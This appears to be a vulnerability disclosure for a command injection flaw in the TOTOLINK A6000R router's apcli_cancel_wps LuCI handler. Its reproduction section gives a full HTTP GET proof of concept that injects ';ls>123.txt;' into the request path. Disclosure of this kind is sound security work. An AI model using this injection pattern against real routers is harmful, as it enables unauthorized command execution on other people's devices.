# Vulnerability Title

TOTOLINK A6000R router has a command injection vulnerability

# Vulnerability Description
There is a command injection vulnerability in the apcli_cancel_wps function in the firmware version V1.0.1-B20201211.2000 of the TOTOLINK A6000R router.
An attacker can use this vulnerability to remotely execute system commands without authorization, causing the server to collapse.

# Vulnerability Location
/usr/lib/lua/luci/controller/mtkwifi.lua

# Self-rating
very critical

# Firmware version
V1.0.1-B20201211.2000

# Code Analysis

There is a command injection vulnerability in the apcli_cancel_wps function in the /usr/lib/lua/luci/controller/mtkwifi.lua file, which is triggered by the iface parameter. 
An attacker can execute arbitrary commands on the router by constructing a special HTTP request.
![image](https://github.com/user-attachments/assets/7b601b61-0e6f-4cee-8d59-aea4bd5e21af)

route:/admin/mtk/wifi/apcli_cancel_wps/arg
![image](https://github.com/user-attachments/assets/0c4bb4f3-ebf9-42af-9f62-3ec668520ed7)

# Local reproduction

By sending an HTTP GET request to a specific URL, you can inject commands in the iface parameter. 
For example, you can inject the ls>123.txt command to list the directory contents to verify the existence of the vulnerability.
POC
```
GET /cgi-bin/luci/admin/mtk/wifi/apcli_cancel_wps/;ls>123.txt; HTTP/1.1
Host: 192.168.187.136
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=cb3a0fa98f87a1ace139e0d21a61953e
```
![image](https://github.com/user-attachments/assets/d91ec087-7c01-4aef-bc2a-9a9a45114c58)
![image](https://github.com/user-attachments/assets/7f88e08d-02d1-4879-b0b7-9d01f12e1738)

